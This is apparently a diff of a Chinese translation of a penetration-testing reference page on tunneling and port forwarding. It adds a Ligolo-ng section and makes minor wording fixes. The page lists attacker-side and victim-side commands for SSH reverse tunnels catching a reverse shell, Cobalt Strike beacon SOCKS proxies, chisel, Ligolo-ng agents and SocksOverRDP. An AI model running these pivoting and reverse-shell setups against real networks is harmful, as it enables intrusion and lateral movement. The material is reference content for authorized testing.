@@ -23,7 +23,7 @@
 
 ## **Bash**
 
-**Host -> Jump -> InternalA -> InternalB**
+**主机 -> 跳转 -> 内部A -> 内部B**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -74,7 +74,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 这对于通过 DMZ 从内部主机获取反向 shell 到您的主机非常有用：
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
-# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
+# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
 # Note that port 443 must be open
 # Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
 # and change the line "GatewayPorts no" to "GatewayPorts yes"
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS 代理
 
-在 teamserver 中打开一个端口，监听所有接口，以便可以用来 **通过 beacon 路由流量**。
+在 teamserver 中打开一个端口，监听所有可以用来 **通过 beacon 路由流量** 的接口。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -174,7 +174,7 @@ To note:
 ### rPort2Port local
 
 {% hint style="warning" %}
-在这种情况下，**端口在beacon主机中打开**，而不是在团队服务器中，**流量发送到Cobalt Strike客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口
+在这种情况下，**端口在beacon主机上打开**，而不是在团队服务器上，**流量发送到Cobalt Strike客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -206,6 +206,42 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```bash
 ./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
 ./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
+```
+## Ligolo-ng
+
+[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
+
+**代理和代理使用相同的版本**
+
+### 隧道
+```bash
+# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
+sudo ./proxy -selfcert
+# Create an interface named "ligolo" -- Attacker
+interface_create --name "ligolo"
+# Print the currently used certificate fingerprint -- Attacker
+certificate_fingerprint
+# Start the agent with certification validation -- Victim
+./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
+# Select the agent -- Attacker
+session
+1
+# Start the tunnel on the proxy server -- Attacker
+tunnel_start --tun "ligolo"
+# Display the agent's network configuration -- Attacker
+ifconfig
+# Create a route to the agent's specified network -- Attacker
+interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
+# Display the tun interfaces -- Attacker
+interface_list
+```
+### 代理绑定和监听
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
+listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
+# Display the currently running listeners on the agent -- Attacker
+listener_list
 ```
 ## Rpivot
 
@@ -317,10 +353,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-您需要拥有**系统的 RDP 访问权限**。\
+您需要拥有**系统的RDP访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows 的远程桌面服务功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责**在 RDP 连接上隧道数据包**。
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 该工具使用Windows的远程桌面服务功能中的`Dynamic Virtual Channels`（`DVC`）。DVC负责**在RDP连接上隧道数据包**。
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，方法如下：
@@ -328,7 +364,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **受害者**，我们应该收到一个 **提示**，说明 **SocksOverRDP 插件已启用**，并且它将 **监听** 在 **127.0.0.1:1080**。
+现在我们可以通过 **RDP** 使用 **`mstsc.exe`** 连接到 **victim**，我们应该收到一个 **prompt**，提示 **SocksOverRDP 插件已启用**，并且它将 **listen** 在 **127.0.0.1:1080**。
 
 通过 **RDP** 连接并在受害者机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
 ```
@@ -340,7 +376,7 @@ netstat -antb | findstr 1080
 ```
 现在您可以使用 [**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**
 
-## 通过 Proxifier 代理 Windows GUI 应用程序
+## 代理 Windows GUI 应用程序
 
 您可以使用 [**Proxifier**](https://www.proxifier.com/) 使 Windows GUI 应用程序通过代理进行导航。\
 在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
@@ -366,8 +402,8 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的2222端口连接到它。\
-你也可以使用一个连接到localhost:443的**meterpreter**，攻击者在2222端口监听。
+现在，如果你在受害者的**SSH**服务上设置监听端口为443。你可以通过攻击者的端口2222连接到它。\
+你也可以使用一个连接到localhost:443的**meterpreter**，攻击者在端口2222监听。
 
 ## YARP
 
@@ -437,7 +473,7 @@ ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.1
 ```
 ### ptunnel-ng
 
-[**从这里下载**](https://github.com/utoni/ptunnel-ng.git).
+[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。
 ```bash
 # Generate it
 sudo ./autogen.sh
@@ -487,7 +523,7 @@ chmod a+x ./ngrok
 ```
 #### 嗅探 HTTP 调用
 
-*对 XSS、SSRF、SSTI 等有用*
+*对 XSS, SSRF, SSTI 等有用*
 直接从 stdout 或在 HTTP 接口 [http://127.0.0.1:4040](http://127.0.0.1:4000)。
 
 #### 隧道内部 HTTP 服务
